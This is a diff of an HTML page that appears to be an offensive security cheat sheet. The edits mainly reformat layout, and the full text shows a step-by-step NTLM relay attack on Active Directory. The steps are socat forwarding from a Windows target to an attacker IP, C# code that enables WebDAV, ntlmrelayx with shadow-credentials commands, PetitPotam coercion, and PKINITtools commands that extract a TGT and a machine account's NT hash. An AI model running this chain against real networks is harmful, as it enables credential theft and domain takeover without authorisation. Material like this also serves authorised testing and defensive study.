@@ -208,11 +208,14 @@
 
 <div class="content"><hr>
 <h3 id="1-run-socat-to-redirect-traffic-in-windows-target">1. Run socat to redirect traffic (In Windows Target)</h3>
-<p><a href="https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master">socat</a></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Upload socat.zip</span>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Upload socat.zip and unzip</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">Compression</span><span class="p">.</span><span class="n">FileSystem</span><span class="p">;</span> <span class="p">[</span><span class="no">System.IO.Compression.ZipFile</span><span class="p">]::</span><span class="n">ExtractToDirectory</span><span class="p">(</span><span class="s1">&#39;c:\programdata\socat.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;c:\programdata&#39;</span><span class="p">)</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">socat</span><span class="p">.</span><span class="py">exe</span> <span class="nb">tcp-listen</span><span class="err">:</span><span class="mf">8090</span><span class="p">,</span><span class="n">reuseaddr</span><span class="p">,</span><span class="n">fork</span> <span class="n">tcp</span><span class="err">:</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="err">:</span><span class="mf">80</span>
-</span></span></code></pre></div><h3 id="2-enable-webdav-in-windows-target">2. Enable webdav (In Windows Target)</h3>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master">socat</a></em></small></p>
+<h3 id="2-enable-webdav-in-windows-target">2. Enable webdav (In Windows Target)</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$Source</span> <span class="p">=</span> <span class="sh">@&#34;
 </span></span></span><span class="line"><span class="cl"><span class="sh">using System;
 </span></span></span><span class="line"><span class="cl"><span class="sh">using System.Text;
@@ -281,11 +284,15 @@
 </span></span><span class="line"><span class="cl"><span class="nv">$compilerParameters</span><span class="p">.</span><span class="n">CompilerOptions</span><span class="p">=</span><span class="s2">&#34;/unsafe&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Add-Type</span> <span class="n">-TypeDefinition</span> <span class="nv">$Source</span> <span class="n">-Language</span> <span class="n">CSharp</span> <span class="n">-CompilerParameters</span> <span class="nv">$compilerParameters</span>
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">JosL.WebClient.Starter</span><span class="p">]::</span><span class="n">startService</span><span class="p">()</span>
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<br>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Run enable_webdav.ps1</span>
 </span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">programdata</span><span class="p">\</span><span class="n">enable_webdav</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div><h3 id="3-start-ntlmrelayx-listener-in-local-linux">3. Start ntlmrelayx listener (In Local Linux)</h3>
+</span></span></code></pre></div></div>
+<h3 id="3-start-ntlmrelayx-listener-in-local-linux">3. Start ntlmrelayx listener (In Local Linux)</h3>
 <h4 id="get-impacket-fork--add-shadow-credentials-commands-to-ntlmrelayxs-interactive-ldap-shell">Get impacket fork : Add Shadow Credentials Commands to Ntlmrelayx&rsquo;s Interactive LDAP Shell</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone -b interactive-ldap-shadow-creds https://github.com/Tw1sm/impacket.git
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> impacket
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git checkout -b remotes/origin/interactive-ldap-shadow-creds
@@ -293,22 +300,33 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">source</span> test/bin/activate
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip install .
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip3 install impacket <span class="nv">pyOpenSSL</span><span class="o">==</span>24.0.0
-</span></span></code></pre></div><h4 id="run-ntlmrelayx">Run ntlmrelayx</h4>
+</span></span></code></pre></div></div>
+<h4 id="run-ntlmrelayx">Run ntlmrelayx</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 examples/ntlmrelayx.py -t ldaps://&lt;DC&gt; --delegate-access -i
-</span></span></code></pre></div><h3 id="4-run-petitpotam-in-local-linux">4. Run PetitPotam (In Local Linux)</h3>
-<p><a href="https://github.com/topotam/PetitPotam">PetitPotam</a></p>
+</span></span></code></pre></div></div>
+<h3 id="4-run-petitpotam-in-local-linux">4. Run PetitPotam (In Local Linux)</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python3 PetitPotam.py -u &lt;USERNAME&gt; -hashes :&lt;HASH&gt; &lt;SOCAT_HOSTNAME&gt;@8090/test &lt;SOCAT_LISTENER_IP&gt; -pipe all
-</span></span></code></pre></div><h3 id="5-connect-to-ldap-shell-in-local-linux">5. Connect to LDAP shell (In Local Linux)</h3>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/topotam/PetitPotam">PetitPotam</a></em></small></p>
+<h3 id="5-connect-to-ldap-shell-in-local-linux">5. Connect to LDAP shell (In Local Linux)</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rlwrap nc 127.0.0.1 <span class="m">11000</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">clear_shadow_creds &lt;SOCAT_HOSTNAME&gt;$
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Take Note: pfx path and password</span>
 </span></span><span class="line"><span class="cl">set_shadow_creds &lt;SOCAT_HOSTNAME&gt;$
-</span></span></code></pre></div><h3 id="6-request-tgt-using-pfx-file-in-local-linux">6. Request TGT using pfx file (In Local Linux)</h3>
-<p><a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></p>
+</span></span></code></pre></div></div>
+<h3 id="6-request-tgt-using-pfx-file-in-local-linux">6. Request TGT using pfx file (In Local Linux)</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python3 gettgtpkinit.py &lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$ &lt;SOCAT_HOSTNAME&gt;.ccache -cert-pfx &lt;RANDOM_CHARS&gt;.pfx -pfx-pass &lt;RANDOM_CHARS_PASSWORD&gt; -dc-ip &lt;DC&gt;
-</span></span></code></pre></div><h3 id="7-get-nt-hash-in-local-linux">7. Get NT Hash (In Local Linux)</h3>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></em></small></p>
+<h3 id="7-get-nt-hash-in-local-linux">7. Get NT Hash (In Local Linux)</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python3 getnthash.py &lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$ -key &lt;AS-REP_encryption_key&gt;
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
